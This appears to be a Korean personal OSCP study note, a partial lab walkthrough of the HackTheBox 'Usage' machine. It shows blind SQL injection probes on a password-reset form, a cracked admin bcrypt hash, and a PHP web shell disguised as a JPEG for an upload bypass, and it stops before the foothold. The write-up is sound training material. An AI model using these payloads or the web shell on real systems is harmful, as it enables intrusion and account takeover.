---
slug: "usage"
title: "usage"
date: 2026-07-06
category: "리눅스"
section: "OSCP"
tags: []
excerpt: "gobuster 결과 robots.txt가 열려 있다는걸 확인할 수 있고 ~~~ User-agent: * Disallow: ~~~ 다음과 같은 내용이 있음 -> 크롤링을 차단하는…"
readingTime: 6
---

---
#### Box: [이름] | [Linux/Windows/AD] | [Easy/Medium/Hard]
날짜:
소요시간:

##### Open Ports
22
80
##### Interesting Services
```shell
#80포트 host파일에 등록
echo "10.129.22.253 usage.htb" | sudo tee -a /etc/hosts

# vhost도 있는거 같아서 얘도 등록
echo "10.129.22.253 admin.usage.htb" | sudo tee -a /etc/hosts
```

gobuster 결과 robots.txt가 열려 있다는걸 확인할 수 있고 
~~~
User-agent: *
Disallow:
~~~
다음과 같은 내용이 있음 -> 크롤링을 차단하는 사이트가 없다는 뜻

burpsuite를 보면 로그인 시에
```
POST /post-login HTTP/1.1
Host: usage.htb
Content-Length: 93
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://usage.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://usage.htb/login
Accept-Encoding: gzip, deflate, br
Cookie: XSRF-TOKEN=eyJpdiI6InBiTWhOWkErVlpkR242WDV0TUw2NkE9PSIsInZhbHVlIjoiQjZYS0FRM0Q2RFBqaDY2QUl4aVc1VENpdnZUemRRQUxSNGNRaGxRTncraFVySDlRaytLaWkrQzZEbDBZMW5SUjg4NVNkRzBqQ1NTbFllaTBTS2IrUTZTZ0JiL29CVmVLbU85dFpRZUlaclRVWE9vQ0ZoWDFIZDVxekJsWW5QMWMiLCJtYWMiOiJkMzdiZmZiMDlkYmVmZDBiMTRkNTBkMDgxOWEyNDgwOTYzOWNkZDQ1ZTNmODQ1NWEwYzVlNTJjODdmOTJhMjA0IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IlNKaG12S2NBaGJvcEx3NnYvRWxuZFE9PSIsInZhbHVlIjoiMlY2U25HdVI0eHk2UDA0Y3dNTzZZRzZCNjJDNDZkMjdialBjR2xYUGVWbi92NTFJSG05WlQ3OExjWm05ZzJyQ3dvMDVhL0FyM2hRaXczQytSSkFOUnpuRFJmTEExbXlHVHJuc3VEL1hxZGRUVWpBRXR1VldMTEU0SUo5MzN4cUoiLCJtYWMiOiI2YmNjYTFhOTQyMDg2NTQ2OGZmN2RlODdhZDgxMTZlZjYwMzY2YzExNDAyOGM3NTNmM2I5YjhhOGQ5ZjAxNWU4IiwidGFnIjoiIn0%3D
Connection: keep-alive

_token=N35yN3NyK6q08MB3NX3FVgzu94uhIOIwuNQYBii4&email=kimbell0428%40naver.com&password=dfsafsda
```
-> 잘 모르겠음

/reset-password 보면 이런거도 됨
```
# ' or 1=1 -- -
We have e-mailed your password reset link to ' or 1=1 -- -
# ' or 1=2 -- -
Email address does not match in our records!
```
-> blind sqli 같음
일단 db 이름부터 하나씩 뽑아와보자
그냥 코드 하나 짰음 [[Blind sqli script]]

**db이름**: usage_blog
**테이블 구조**: admin_users
**컬럼**: id,username,password
**데이터**: admin | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2

```shell
hashcat -m 3200 -a 0 '$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2' /usr/share/wordlists/rockyou.txt
```
-> whatever1
-> 로그인 성공

setting들어가보니까 이미지를 넣을 수 있음 php 파일을 넣어보려 함
```
┌──(kali㉿kali)-[~/htb/usage]
└─$ printf '\xff\xd8\xff' > exploit.php.jpg
                                                                                                                  
┌──(kali㉿kali)-[~/htb/usage]
└─$ echo '<?php system($_GET["cmd"]); ?>' >> exploit.php.jpg

```
매직바이트까지 다 수정한 파일 넣으니까 갑자기

`eb8af34bc45b36ef764402eb61022a0a.jpg`

이름이 이렇게 바뀜



##### Initial Foothold
벡터:
명령어:

##### Privilege Escalation
벡터:
명령어:

##### Rabbit Hole (막혔던 것)

##### 다음 박스에서 써먹을 것

##### 스크린샷 체크
- [ ] whoami
- [ ] ipconfig/ifconfig
- [ ] proof/local 파일

---
